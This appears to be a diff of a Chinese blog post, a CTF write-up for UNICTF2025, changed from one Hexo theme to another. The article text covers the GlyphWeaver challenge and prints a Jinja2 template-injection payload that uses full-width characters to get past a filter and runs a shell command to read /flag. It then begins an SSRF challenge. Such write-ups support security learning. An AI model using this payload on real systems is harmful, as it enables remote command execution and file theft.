@@ -1,313 +1,210 @@
-<!DOCTYPE html>
-<html lang="zh-CN">
-<head>
-  <meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
-<meta name="theme-color" content="#222">
-<meta name="generator" content="Hexo 8.1.1">
-  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
-  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
-  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
-  <link rel="mask-icon" href="/images/logo.svg" color="#222">
-
-<link rel="stylesheet" href="/css/main.css">
-
-
-<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
-  <link rel="stylesheet" href="/lib/pace/pace-theme-minimal.min.css">
-  <script src="/lib/pace/pace.min.js"></script>
-
-<script id="hexo-configurations">
-    var NexT = window.NexT || {};
-    var CONFIG = {"hostname":"cxyadvancer.github.io","root":"/","scheme":"Pisces","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
-  </script>
-
-  <meta name="description" content="前言题目来源https:&#x2F;&#x2F;www.ctfplus.cn&#x2F;，可以直接搜索标签&#96;UNICTF2025&#96;就可以找到题目了。这个当时参加之后没有系统复现学习，学习一下 webGlyphWeaver首先看源码  这里注释写到了使用的jinja2模板，还有两个路由POST &#x2F;api&#x2F;preview → 实时预览POST &#x2F;api&#x2F;export → 创建导出任务（异步）">
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>UNICTF2025 | Seove0n</title><meta name="author" content="Seove0n"><meta name="copyright" content="Seove0n"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="ffffff"><meta name="description" content="前言题目来源https:&#x2F;&#x2F;www.ctfplus.cn&#x2F;，可以直接搜索标签&#96;UNICTF2025&#96;就可以找到题目了。这个当时参加之后没有系统复现学习，学习一下 webGlyphWeaver首先看源码  这里注释写到了使用的jinja2模板，还有两个路由POST &#x2F;api&#x2F;preview → 实时预览POST &#x2F;api&#x2F;export → 创建导出任务（异步）">
 <meta property="og:type" content="article">
 <meta property="og:title" content="UNICTF2025">
 <meta property="og:url" content="https://cxyadvancer.github.io/2026/04/23/UNICTF2025/index.html">
-<meta property="og:site_name" content="程序元的blog">
+<meta property="og:site_name" content="Seove0n">
 <meta property="og:description" content="前言题目来源https:&#x2F;&#x2F;www.ctfplus.cn&#x2F;，可以直接搜索标签&#96;UNICTF2025&#96;就可以找到题目了。这个当时参加之后没有系统复现学习，学习一下 webGlyphWeaver首先看源码  这里注释写到了使用的jinja2模板，还有两个路由POST &#x2F;api&#x2F;preview → 实时预览POST &#x2F;api&#x2F;export → 创建导出任务（异步）">
 <meta property="og:locale" content="zh_CN">
-<meta property="og:image" content="https://cxyadvancer.github.io/2026/04/23/UNICTF2025/image-20260416205458638.png">
-<meta property="og:image" content="https://cxyadvancer.github.io/2026/04/23/UNICTF2025/image-20260416211519592.png">
-<meta property="og:image" content="https://cxyadvancer.github.io/2026/04/23/UNICTF2025/image-20260416211954756.png">
-<meta property="og:image" content="https://cxyadvancer.github.io/2026/04/23/UNICTF2025/image-20260418155507777.png">
-<meta property="og:image" content="https://cxyadvancer.github.io/2026/04/23/UNICTF2025/image-20260418155726702.png">
-<meta property="og:image" content="https://cxyadvancer.github.io/2026/04/23/UNICTF2025/image-20260418161838548.png">
-<meta property="og:image" content="https://cxyadvancer.github.io/2026/04/23/UNICTF2025/image-20260418162541316.png">
-<meta property="og:image" content="https://cxyadvancer.github.io/2026/04/23/UNICTF2025/image-20260418162658169.png">
-<meta property="og:image" content="https://cxyadvancer.github.io/2026/04/23/UNICTF2025/image-20260418162810558.png">
-<meta property="og:image" content="https://cxyadvancer.github.io/2026/04/23/UNICTF2025/image-20260418162912578.png">
-<meta property="og:image" content="https://cxyadvancer.github.io/2026/04/23/UNICTF2025/image-20260418162931039.png">
-<meta property="og:image" content="https://cxyadvancer.github.io/2026/04/23/UNICTF2025/image-20260418163723143.png">
-<meta property="og:image" content="https://cxyadvancer.github.io/2026/04/23/UNICTF2025/image-20260418163831186.png">
-<meta property="og:image" content="https://cxyadvancer.github.io/2026/04/23/UNICTF2025/image-20260418163852691.png">
-<meta property="og:image" content="https://cxyadvancer.github.io/2026/04/23/UNICTF2025/image-20260418170553983.png">
-<meta property="og:image" content="https://cxyadvancer.github.io/2026/04/23/UNICTF2025/image-20260418171734084.png">
-<meta property="og:image" content="https://cxyadvancer.github.io/2026/04/23/UNICTF2025/image-20260418175022027.png">
-<meta property="og:image" content="https://cxyadvancer.github.io/2026/04/23/UNICTF2025/image-20260418175048960.png">
-<meta property="og:image" content="https://cxyadvancer.github.io/2026/04/23/UNICTF2025/image-20260418175356263.png">
-<meta property="og:image" content="https://cxyadvancer.github.io/2026/04/23/UNICTF2025/image-20260418175619114.png">
-<meta property="og:image" content="https://cxyadvancer.github.io/2026/04/23/UNICTF2025/image-20260418175729362.png">
-<meta property="og:image" content="https://cxyadvancer.github.io/2026/04/23/UNICTF2025/image-20260418181522859.png">
-<meta property="og:image" content="https://cxyadvancer.github.io/2026/04/23/UNICTF2025/image-20260418182414697.png">
-<meta property="og:image" content="https://cxyadvancer.github.io/2026/04/23/UNICTF2025/image-20260418182915821.png">
-<meta property="og:image" content="https://cxyadvancer.github.io/2026/04/23/UNICTF2025/image-20260418183102755.png">
-<meta property="og:image" content="https://cxyadvancer.github.io/2026/04/23/UNICTF2025/image-20260418183230784.png">
-<meta property="og:image" content="https://cxyadvancer.github.io/2026/04/23/UNICTF2025/image-20260418183509488.png">
-<meta property="og:image" content="https://cxyadvancer.github.io/2026/04/23/UNICTF2025/image-20260418185414574.png">
-<meta property="og:image" content="https://cxyadvancer.github.io/2026/04/23/UNICTF2025/image-20260419145259979.png">
-<meta property="og:image" content="https://cxyadvancer.github.io/2026/04/23/UNICTF2025/image-20260419145505003.png">
-<meta property="og:image" content="https://cxyadvancer.github.io/2026/04/23/UNICTF2025/image-20260419150509191.png">
-<meta property="og:image" content="https://cxyadvancer.github.io/2026/04/23/UNICTF2025/image-20260419150834373.png">
-<meta property="og:image" content="https://cxyadvancer.github.io/2026/04/23/UNICTF2025/image-20260419151204480.png">
-<meta property="og:image" content="https://cxyadvancer.github.io/2026/04/23/UNICTF2025/image-20260419151412538.png">
-<meta property="og:image" content="https://cxyadvancer.github.io/2026/04/23/UNICTF2025/image-20260419153628190.png">
-<meta property="og:image" content="https://cxyadvancer.github.io/2026/04/23/UNICTF2025/image-20260419230208353.png">
-<meta property="og:image" content="https://cxyadvancer.github.io/2026/04/23/UNICTF2025/image-20260419230859493.png">
-<meta property="og:image" content="https://cxyadvancer.github.io/2026/04/23/UNICTF2025/image-20260420202031234.png">
-<meta property="og:image" content="https://cxyadvancer.github.io/2026/04/23/UNICTF2025/image-20260420202304255.png">
-<meta property="og:image" content="https://cxyadvancer.github.io/2026/04/23/UNICTF2025/image-20260421195300753.png">
-<meta property="og:image" content="https://cxyadvancer.github.io/2026/04/23/UNICTF2025/image-20260421195712554.png">
-<meta property="og:image" content="https://cxyadvancer.github.io/2026/04/23/UNICTF2025/image-20260421201418130.png">
-<meta property="og:image" content="https://cxyadvancer.github.io/2026/04/23/UNICTF2025/image-20260421201520801.png">
-<meta property="og:image" content="https://cxyadvancer.github.io/2026/04/23/UNICTF2025/image-20260421202011339.png">
-<meta property="og:image" content="https://cxyadvancer.github.io/2026/04/23/UNICTF2025/image-20260422155409414.png">
-<meta property="og:image" content="https://cxyadvancer.github.io/2026/04/23/UNICTF2025/image-20260422161105963.png">
-<meta property="og:image" content="https://cxyadvancer.github.io/2026/04/23/UNICTF2025/image-20260418210926719.png">
-<meta property="og:image" content="https://cxyadvancer.github.io/2026/04/23/UNICTF2025/image-20260418211247102.png">
-<meta property="og:image" content="https://cxyadvancer.github.io/2026/04/23/UNICTF2025/image-20260418213856593.png">
-<meta property="og:image" content="https://cxyadvancer.github.io/2026/04/23/UNICTF2025/image-20260418215059300.png">
-<meta property="og:image" content="https://cxyadvancer.github.io/2026/04/23/UNICTF2025/image-20260419233733131.png">
-<meta property="og:image" content="https://cxyadvancer.github.io/2026/04/23/UNICTF2025/%E5%98%89%E8%B1%AA.png">
-<meta property="og:image" content="https://cxyadvancer.github.io/2026/04/23/UNICTF2025/image-20260422172244584.png">
-<meta property="og:image" content="https://cxyadvancer.github.io/2026/04/23/UNICTF2025/image-20260422172437537.png">
-<meta property="og:image" content="https://cxyadvancer.github.io/2026/04/23/UNICTF2025/image-20260422173724704.png">
-<meta property="og:image" content="https://cxyadvancer.github.io/2026/04/23/UNICTF2025/image-20260422175023215.png">
-<meta property="og:image" content="https://cxyadvancer.github.io/2026/04/23/UNICTF2025/image-20260426155823710.png">
-<meta property="og:image" content="https://cxyadvancer.github.io/2026/04/23/UNICTF2025/image-20260426155917514.png">
-<meta property="og:image" content="https://cxyadvancer.github.io/2026/04/23/UNICTF2025/image-20260426170236751.png">
-<meta property="og:image" content="https://cxyadvancer.github.io/2026/04/23/UNICTF2025/image-20260426171555335.png">
-<meta property="og:image" content="https://cxyadvancer.github.io/2026/04/23/UNICTF2025/image-20260426172616940.png">
-<meta property="og:image" content="https://cxyadvancer.github.io/2026/04/23/UNICTF2025/image-20260426174308993.png">
-<meta property="og:image" content="https://cxyadvancer.github.io/2026/04/23/UNICTF2025/image-20260426174507438.png">
-<meta property="og:image" content="https://cxyadvancer.github.io/2026/04/23/UNICTF2025/image-20260426173249096.png">
-<meta property="og:image" content="https://cxyadvancer.github.io/2026/04/23/UNICTF2025/image-20260426174856984.png">
+<meta property="og:image" content="https://cxyadvancer.github.io/image/2.jpg">
 <meta property="article:published_time" content="2026-04-23T11:33:14.000Z">
 <meta property="article:modified_time" content="2026-05-07T02:26:48.909Z">
-<meta property="article:author" content="程序元">
+<meta property="article:author" content="Seove0n">
 <meta property="article:tag" content="比赛复盘">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="https://cxyadvancer.github.io/2026/04/23/UNICTF2025/image-20260416205458638.png">
+<meta name="twitter:image" content="https://cxyadvancer.github.io/image/2.jpg"><script type="application/ld+json">{
+  "@context": "https://schema.org",
+  "@type": "BlogPosting",
+  "headline": "UNICTF2025",
+  "url": "https://cxyadvancer.github.io/2026/04/23/UNICTF2025/",
+  "image": "https://cxyadvancer.github.io/image/2.jpg",
+  "datePublished": "2026-04-23T11:33:14.000Z",
+  "dateModified": "2026-05-07T02:26:48.909Z",
+  "author": [
+    {
+      "@type": "Person",
+      "name": "Seove0n",
+      "url": "https://cxyadvancer.github.io"
+    }
+  ]
+}</script><link rel="shortcut icon" href="/image/2.jpg"><link rel="canonical" href="https://cxyadvancer.github.io/2026/04/23/UNICTF2025/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css?v=5.5.5"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@7.2.0/css/all.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui@6.1.14/dist/fancybox/fancybox.min.css" media="print" onload="this.media='all'"><script>
+    (() => {
+      
+    const saveToLocal = {
+      set: (key, value, ttl) => {
+        if (!ttl) return
+        const expiry = Date.now() + ttl * 86400000
+        localStorage.setItem(key, JSON.stringify({ value, expiry }))
+      },
+      get: key => {
+        const itemStr = localStorage.getItem(key)
+        if (!itemStr) return undefined
+        const { value, expiry } = JSON.parse(itemStr)
+        if (Date.now() > expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return value
+      }
+    }
 
-<link rel="canonical" href="https://cxyadvancer.github.io/2026/04/23/UNICTF2025/">
-
-
-<script id="page-configurations">
-  // https://hexo.io/docs/variables.html
-  CONFIG.page = {
-    sidebar: "",
-    isHome : false,
-    isPost : true,
-    lang   : 'zh-CN'
-  };
-</script>
-
-  <title>UNICTF2025 | 程序元的blog</title>
+    window.btf = {
+      saveToLocal,
+      getScript: (url, attr = {}) => new Promise((resolve, reject) => {
+        const script = document.createElement('script')
+        script.src = url
+        script.async = true
+        Object.entries(attr).forEach(([key, val]) => script.setAttribute(key, val))
+        script.onload = script.onreadystatechange = () => {
+          if (!script.readyState || /loaded|complete/.test(script.readyState)) resolve()
+        }
+        script.onerror = reject
+        document.head.appendChild(script)
+      }),
+      getCSS: (url, id) => new Promise((resolve, reject) => {
+        const link = document.createElement('link')
+        link.rel = 'stylesheet'
+        link.href = url
+        if (id) link.id = id
+        link.onload = link.onreadystatechange = () => {
+          if (!link.readyState || /loaded|complete/.test(link.readyState)) resolve()
+        }
+        link.onerror = reject
+        document.head.appendChild(link)
+      }),
+      addGlobalFn: (key, fn, name = false, parent = window) => {
+        if (!false && key.startsWith('pjax')) return
+        const globalFn = parent.globalFn || {}
+        globalFn[key] = globalFn[key] || {}
+        globalFn[key][name || Object.keys(globalFn[key]).length] = fn
+        parent.globalFn = globalFn
+      }
+    }
   
+      
+      const activateDarkMode = () => {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      const activateLightMode = () => {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', 'ffffff')
+        }
+      }
 
+      btf.activateDarkMode = activateDarkMode
+      btf.activateLightMode = activateLightMode
 
-
-
-
-
-  <noscript>
-  <style>
-  .use-motion .brand,
-  .use-motion .menu-item,
-  .sidebar-inner,
-  .use-motion .post-block,
-  .use-motion .pagination,
-  .use-motion .comments,
-  .use-motion .post-header,
-  .use-motion .post-body,
-  .use-motion .collection-header { opacity: initial; }
-
-  .use-motion .site-title,
-  .use-motion .site-subtitle {
-    opacity: initial;
-    top: initial;
-  }
-
-  .use-motion .logo-line-before i { left: initial; }
-  .use-motion .logo-line-after i { right: initial; }
-  </style>
-</noscript>
-
-</head>
-
-<body itemscope itemtype="http://schema.org/WebPage">
-  <div class="container use-motion">
-    <div class="headband"></div>
-
-    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
-      <div class="header-inner"><div class="site-brand-container">
-  <div class="site-nav-toggle">
-    <div class="toggle" aria-label="切换导航栏">
-      <span class="toggle-line toggle-line-first"></span>
-      <span class="toggle-line toggle-line-middle"></span>
-      <span class="toggle-line toggle-line-last"></span>
-    </div>
-  </div>
-
-  <div class="site-meta">
-
-    <a href="/" class="brand" rel="start">
-      <span class="logo-line-before"><i></i></span>
-      <h1 class="site-title">程序元的blog</h1>
-      <span class="logo-line-after"><i></i></span>
-    </a>
-  </div>
-
-  <div class="site-nav-right">
-    <div class="toggle popup-trigger">
-    </div>
-  </div>
-</div>
-
-
-
-
-<nav class="site-nav">
-  <ul id="menu" class="main-menu menu">
-        <li class="menu-item menu-item-home">
-
-    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
-
-  </li>
-        <li class="menu-item menu-item-about">
-
-    <a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a>
-
-  </li>
-        <li class="menu-item menu-item-tags">
-
-    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a>
-
-  </li>
-        <li class="menu-item menu-item-categories">
-
-    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a>
-
-  </li>
-        <li class="menu-item menu-item-archives">
-
-    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>
-
-  </li>
-  </ul>
-</nav>
-
-
-
-
-</div>
-    </header>
-
+      const theme = saveToLocal.get('theme')
     
-  <div class="back-to-top">
-    <i class="fa fa-arrow-up"></i>
-    <span>0%</span>
-  </div>
-
-
-    <main class="main">
-      <div class="main-inner">
-        <div class="content-wrap">
-          
-
-          <div class="content post posts-expand">
-            
-
-    
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="https://cxyadvancer.github.io/2026/04/23/UNICTF2025/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.gif">
-      <meta itemprop="name" content="程序元">
-      <meta itemprop="description" content="路漫漫其修远兮，吾将上下而求索。">
-    </span>
-    
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="程序元的blog">
-    </span>
-      <header class="post-header">
-        <h1 class="post-title" itemprop="name headline">
-          UNICTF2025
-        </h1>
-    
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">发表于</span>
-    
-              <time title="创建时间：2026-04-23 19:33:14" itemprop="dateCreated datePublished" datetime="2026-04-23T19:33:14+08:00">2026-04-23</time>
-            </span>
-              <span class="post-meta-item">
-                <span class="post-meta-item-icon">
-                  <i class="far fa-calendar-check"></i>
-                </span>
-                <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2026-05-07 10:26:48" itemprop="dateModified" datetime="2026-05-07T10:26:48+08:00">2026-05-07</time>
-              </span>
-    
-          <br>
-            <span class="post-meta-item" title="本文字数">
-              <span class="post-meta-item-icon">
-                <i class="far fa-file-word"></i>
-              </span>
-                <span class="post-meta-item-text">本文字数：</span>
-             <span></span>
-            </span>
-            <span class="post-meta-item" title="阅读时长">
-              <span class="post-meta-item-icon">
-                <i class="far fa-clock"></i>
-              </span>
-                <span class="post-meta-item-text">阅读时长 &asymp;</span>
-              <span>undefined 分钟</span>
-            </span>
-    
-        </div>
-      </header>
-    
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
+          theme === 'dark' ? activateDarkMode() : theme === 'light' ? activateLightMode() : null
+        
+      
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        document.documentElement.classList.toggle('hide-aside', asideStatus === 'hide')
+      }
     
       
-        <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>题目来源<a target="_blank" rel="noopener" href="https://www.ctfplus.cn/%EF%BC%8C%E5%8F%AF%E4%BB%A5%E7%9B%B4%E6%8E%A5%E6%90%9C%E7%B4%A2%E6%A0%87%E7%AD%BE%60UNICTF2025%60%E5%B0%B1%E5%8F%AF%E4%BB%A5%E6%89%BE%E5%88%B0%E9%A2%98%E7%9B%AE%E4%BA%86%E3%80%82%E8%BF%99%E4%B8%AA%E5%BD%93%E6%97%B6%E5%8F%82%E5%8A%A0%E4%B9%8B%E5%90%8E%E6%B2%A1%E6%9C%89%E7%B3%BB%E7%BB%9F%E5%A4%8D%E7%8E%B0%E5%AD%A6%E4%B9%A0%EF%BC%8C%E5%AD%A6%E4%B9%A0%E4%B8%80%E4%B8%8B">https://www.ctfplus.cn/，可以直接搜索标签`UNICTF2025`就可以找到题目了。这个当时参加之后没有系统复现学习，学习一下</a></p>
+    const detectApple = () => {
+      if (/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)) {
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+  
+    })()
+  </script><script>const GLOBAL_CONFIG = {
+  root: '/',
+  algolia: undefined,
+  localSearch: {"path":"/search.xml","preload":false,"top_n_per_article":1,"unescape":false,"pagination":{"enable":false,"hitsPerPage":8},"languages":{"hits_empty":"未找到符合您查询的内容：${query}","hits_stats":"共找到 ${hits} 篇文章"}},
+  translate: {"defaultEncoding":2,"translateDelay":0,"msgToTraditionalChinese":"繁","msgToSimplifiedChinese":"簡"},
+  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false,"highlightFullpage":false,"highlightMacStyle":true},
+  copy: {
+    success: '复制成功',
+    error: '复制失败',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  dateSuffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'fancybox',
+  Snackbar: undefined,
+  infinitegrid: {
+    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid@4.13.0/dist/infinitegrid.min.js',
+    buttonText: '加载更多'
+  },
+  isPhotoFigcaption: false,
+  islazyloadPlugin: true,
+  isAnchor: false,
+  percent: {
+    toc: true,
+    rightside: true,
+  },
+  autoDarkmode: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: 'UNICTF2025',
+  isHighlightShrink: false,
+  isToc: true,
+  pageType: 'post'
+}</script><link rel="stylesheet" href="/css/custom.css"><meta name="generator" content="Hexo 8.1.1"></head><body><div id="loading-box"><div class="loading-left-bg"></div><div class="loading-right-bg"></div><div class="spinner-box"><div class="configure-border-1"><div class="configure-core"></div></div><div class="configure-border-2"><div class="configure-core"></div></div><div class="loading-word">加载中...</div></div></div><script>(()=>{
+  const $loadingBox = document.getElementById('loading-box')
+  const $body = document.body
+  const preloader = {
+    endLoading: () => {
+      if ($loadingBox.classList.contains('loaded')) return
+      $body.style.overflow = ''
+      $loadingBox.classList.add('loaded')
+    },
+    initLoading: () => {
+      $body.style.overflow = 'hidden'
+      $loadingBox.classList.remove('loaded')
+    }
+  }
+
+  preloader.initLoading()
+
+  if (document.readyState === 'complete') {
+    preloader.endLoading()
+  } else {
+    window.addEventListener('load', preloader.endLoading)
+    document.addEventListener('DOMContentLoaded', preloader.endLoading)
+    // Add timeout protection: force end after 7 seconds
+    setTimeout(preloader.endLoading, 7000)
+  }
+
+  if (false) {
+    btf.addGlobalFn('pjaxSend', preloader.initLoading, 'preloader_init')
+    btf.addGlobalFn('pjaxComplete', preloader.endLoading, 'preloader_end')
+  }
+})()</script><div class="bg-animation" id="web_bg" style="background-image: url(/image/2.jpg);"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img text-center"><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/image/2.jpg" onerror="this.onerror=null;this.src='/null'" alt="avatar"/></div><div class="site-data text-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">19</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">6</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">3</div></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-user"></i><span> About</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-th"></i><span> Categories</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header"><nav id="nav"><span id="blog-info"><a class="nav-site-title" href="/"><span class="site-name">Seove0n</span></a><a class="nav-page-title" href="/"><span class="site-name">UNICTF2025</span><span class="site-name"><i class="fa-solid fa-circle-arrow-left"></i><span>  返回首页</span></span></a></span><div id="menus"><div id="search-button"><span class="site-page social-icon search"><i class="fas fa-search fa-fw"></i><span> 搜索</span></span></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-user"></i><span> About</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-th"></i><span> Categories</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div></div><div id="toggle-menu"><span class="site-page"><i class="fas fa-bars fa-fw"></i></span></div></div></nav><div id="post-info"><h1 class="post-title">UNICTF2025</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2026-04-23T11:33:14.000Z" title="发表于 2026-04-23 19:33:14">2026-04-23</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2026-05-07T02:26:48.909Z" title="更新于 2026-05-07 10:26:48">2026-05-07</time></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">总字数:</span><span class="word-count">7k</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">阅读时长:</span><span>31分钟</span></span><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title=""><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">浏览量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="container post-content" id="article-container"><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>题目来源<a target="_blank" rel="noopener" href="https://www.ctfplus.cn/%EF%BC%8C%E5%8F%AF%E4%BB%A5%E7%9B%B4%E6%8E%A5%E6%90%9C%E7%B4%A2%E6%A0%87%E7%AD%BE%60UNICTF2025%60%E5%B0%B1%E5%8F%AF%E4%BB%A5%E6%89%BE%E5%88%B0%E9%A2%98%E7%9B%AE%E4%BA%86%E3%80%82%E8%BF%99%E4%B8%AA%E5%BD%93%E6%97%B6%E5%8F%82%E5%8A%A0%E4%B9%8B%E5%90%8E%E6%B2%A1%E6%9C%89%E7%B3%BB%E7%BB%9F%E5%A4%8D%E7%8E%B0%E5%AD%A6%E4%B9%A0%EF%BC%8C%E5%AD%A6%E4%B9%A0%E4%B8%80%E4%B8%8B">https://www.ctfplus.cn/，可以直接搜索标签`UNICTF2025`就可以找到题目了。这个当时参加之后没有系统复现学习，学习一下</a></p>
 <h1 id="web"><a href="#web" class="headerlink" title="web"></a>web</h1><h2 id="GlyphWeaver"><a href="#GlyphWeaver" class="headerlink" title="GlyphWeaver"></a>GlyphWeaver</h2><p>首先看源码</p>
-<p><img src="/2026/04/23/UNICTF2025/image-20260416205458638.png" alt="image-20260416205458638"></p>
+<p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2026/04/23/UNICTF2025/image-20260416205458638.png" alt="image-20260416205458638"></p>
 <p>这里注释写到了使用的jinja2模板，还有两个路由POST &#x2F;api&#x2F;preview → 实时预览POST &#x2F;api&#x2F;export → 创建导出任务（异步）可以考虑ssti了。</p>
 <p>还有就是这个CJK-friendly，这个就是中日韩统一表意文字。题目经过测试存在waf，过滤了{{}},但是题目提示了这个，在处理中日韩文字，最常见的清理手段就是Unicode Normalization，把全角字符转换为半角字符。可以提在预览界面尝试一下啊</p>
-<p><img src="/2026/04/23/UNICTF2025/image-20260416211519592.png" alt="image-20260416211519592"></p>
+<p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2026/04/23/UNICTF2025/image-20260416211519592.png" alt="image-20260416211519592"></p>
 <p>这里输入的全角字符<code>｛｛７＊７｝｝</code>,经过处理转换为半角字符，这里知识处理过了，便没有渲染执行，而在&#x2F;api&#x2F;export 的二次 Jinja 渲染</p>
 <p>最后的payload</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">｛｛ｌｉｐｓｕｍ.＿＿ｇｌｏｂａｌｓ＿＿.ｏｓ.ｐｏｐｅｎ(&quot;ｃａｔ ／ｆｌａｇ&quot;).ｒｅａｄ()｝｝</span><br></pre></td></tr></table></figure>
 
 <p>下载文件得到flag</p>
-<p><img src="/2026/04/23/UNICTF2025/image-20260416211954756.png" alt="image-20260416211954756"></p>
+<p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2026/04/23/UNICTF2025/image-20260416211954756.png" alt="image-20260416211954756"></p>
 <h2 id="CloudDiag"><a href="#CloudDiag" class="headerlink" title="CloudDiag"></a>CloudDiag</h2><p>这里直接注册进去就是一个ssrf，测试常见的url不太行，没有返回数据。然后是这个Cloud Explorer</p>
